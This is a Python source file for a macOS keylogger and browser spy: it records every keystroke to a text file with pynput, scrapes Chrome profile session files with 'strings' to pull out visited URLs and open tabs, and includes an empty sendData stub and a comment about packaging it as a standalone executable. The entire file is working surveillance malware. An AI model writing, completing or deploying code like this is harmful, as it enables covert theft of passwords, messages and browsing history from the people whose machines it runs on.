import os
import getpass as gp
import time
# dont forget that you're supposed to make this into an exe that doesnt depend on python to be installed ty.
from pynput import keyboard
import sys
import threading
import subprocess

TIME_DELAY = 5


def sendData():

    pass

def viewSessions(profiles):
    track = 0
    while True:
        track = track + 1
        if track >= 2:
            tmpls = []
            try:
                for profile in profiles:
                    with open(f"{profile}", 'r') as file:
                        tmpls = list(file.readlines())
                    with open(f"{profile} recent websites", 'w') as p:
                        p.write(f"{tmpls[-10:]}")
                print(f"{tmpls[-5:]} <---- recent website visited")
            except Exception as e:
                print(f"file still hasnt been made or non existant or some other error {e}")

            time.sleep(TIME_DELAY)
        else:
            print("has not hit second iteration")

    
def fetchSession(os_type):
    while (1):
        if (os_type == "darwin"):
            fin = []
            mac_dir = f"/Users/{gp.getuser()}/Library/\"Application Support\"/Google/Chrome/Default/Sessions"
            mac_dir_os = f"/Users/{gp.getuser()}/Library/Application Support/Google/Chrome/Default/Sessions"
            profile_dir = os.listdir(f"/Users/{gp.getuser()}/Library/Application Support/Google/Chrome/")
            profiles = []

            for profile in range(0, len(profile_dir)):
                if profile_dir[profile] == "System Profile" or profile_dir[profile] == "Guest Profile":  # this checks whether the profile has system profile or guest profile and ignores it because they dont have session data.
                    pass

                elif "Profile" in profile_dir[profile]:  # this adds the profiles that have session data into a list.
                    profiles.append(profile_dir[profile])
            for fileProfiles in profiles:  # this loops through the profiles that have been appended    PS THIS IS WHERE IT GETS A LITTLE ANNOYING.
                with open(fileProfiles, "w") as file:  # opens a file with the profile name as file.
                    mac_dir_os_2 = os.listdir(
                        f"/Users/{gp.getuser()}/Library/Application Support/Google/Chrome/{fileProfiles}/Sessions")  # holds the contents of the profiles session directoy, its formatted differently because the os module takes in a literal string of what the command is supposed to look like.
                    mac_dir_subproc = f"/Users/{gp.getuser()}/Library/\"Application Support\"/Google/Chrome/\"{fileProfiles}\"/Sessions"  # does the same thing as the one above but its formatted to satisfy the subprocesses module.

                    for session in mac_dir_os_2:  # this loops through every session file in the sessions directoy for every profile.
                        print(
                            f"session {session} for {fileProfiles} has been written to")  # this just prints out every session_ file each profile has.
                        if "Session_" in session:
                            val = subprocess.check_output([f"strings {mac_dir_subproc}/{session}"], shell=True).decode()  # this gets the output of links and every other thing on the sessions directory.
                            file.write(val)  # this writes the data to the open file, the open file being those that were opened initially, with their names, profile 1 profile 2 and what not.
            # you're a fucking genius for figuring this out.
            for fileProfiles in profiles:
                with open(fileProfiles, "r") as pf:
                    fin.append(pf.readlines())
                for x in range(0, len(fin[0])):
                    with open(f"{fileProfiles} TABS", "a") as r:
                        if "http" in fin[0][x] or "https" in fin[0][x]:
                            r.write(fin[0][x])
                fin = []

            arr = os.listdir(mac_dir_os)
            lines = []
            final_lines = []
            for session in arr:
                if "Session_" in session:
                    val = subprocess.check_output([f"strings {mac_dir}/{session}"], shell=True).decode()
                    with open("tmp", "w") as f:
                        f.write(val)
                    with open("tmp", "r") as r:
                        lines.append(r.readlines())
            for a in range(0, len(lines[0])):
                if ("https" in lines[0][a] or "http" in lines[0][a]):
                    final_lines.append(lines[0][a])
            with open("Default", "w") as default:
                for x in range(0, len(final_lines)):
                    default.write(final_lines[x])


        else:
            print("didn't write the script for this os lol")
        time.sleep(5)


def determineOs():
    if (sys.platform.startswith("darwin")):
        return "darwin"



def writeToFile(text):
    filename = "KEYSTROKES.txt"

    with open(filename, "a") as file:
        if (text == "Key.space"):
            file.write(" ")
        elif (text == "Key.enter"):
            file.write("\n[ENTER]\n")
        elif (text == "Key.backspace"):
            file.write("[BACKSPACE]")
        elif (text == "Key.caps_lock"):
            file.write("")
        elif (text == "Key.shift_r" or text == "Key.shift"):
            file.write("")
        elif (text == "Key.right" or text == "Key.cmd" or text == "Key.up" or text == "Key.down" or text == "Key.left"):
            file.write("")
        elif (text == "Key.tab"):
            file.write("[TAB]")
        else:
            file.write(text)


def on_press(key):
    try:
        writeToFile(key.char)

    except AttributeError:
        writeToFile(f"{key}")


def on_release(key):
    try:
        if key == keyboard.Key.esc:
            print("EXITING")
            subprocess.call("bash cleanup.sh")
            return False

    except Exception as e:
        print(e)


if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
        thread1 = threading.Thread(target=fetchSession, args=(determineOs(),))
        thread1.start()
        Listener.join()

